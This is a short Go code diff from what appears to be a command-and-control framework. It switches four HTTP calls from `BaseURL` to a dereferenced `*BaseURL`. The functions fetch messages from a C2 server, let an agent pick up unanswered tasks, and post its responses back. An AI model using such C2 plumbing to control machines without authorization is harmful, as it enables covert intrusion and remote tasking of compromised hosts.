@@ -8,7 +8,7 @@ import (
 
 // FetchMessages will reach out to C2 server and fetch messages.
 func FetchMessages(agentID string) (messages []Message, err error) {
-	req, err := http.NewRequest("GET", BaseURL+"/v1/messages/"+agentID, nil)
+	req, err := http.NewRequest("GET", *BaseURL+"/v1/messages/"+agentID, nil)
 	if err != nil {
 		return nil, err
 	}
@@ -29,7 +29,7 @@ func FetchMessages(agentID string) (messages []Message, err error) {
 
 // AgentFetchMessages will reach out to C2 server and fetch messages to which it has not reponded.
 func AgentFetchMessages(agentID string) (messages []Message, err error) {
-	req, err := http.NewRequest("GET", BaseURL+"/v1/messages/"+agentID, nil)
+	req, err := http.NewRequest("GET", *BaseURL+"/v1/messages/"+agentID, nil)
 	if err != nil {
 		return nil, err
 	}
@@ -60,7 +60,7 @@ func AgentRespondToMessage(messageID, response string) (err error) {
 		return err
 	}
 
-	req, err := http.NewRequest(http.MethodPost, BaseURL+"/v1/respond", bytes.NewBuffer(jsonMsgResp))
+	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/v1/respond", bytes.NewBuffer(jsonMsgResp))
 	if err != nil {
 		return err
 	}
@@ -84,7 +84,7 @@ func InsertMessage(message Message) (err error) {
 		return err
 	}
 
-	req, err := http.NewRequest(http.MethodPost, BaseURL+"/v1/messages", bytes.NewBuffer(jsonMsgResp))
+	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/v1/messages", bytes.NewBuffer(jsonMsgResp))
 	if err != nil {
 		return err
 	}
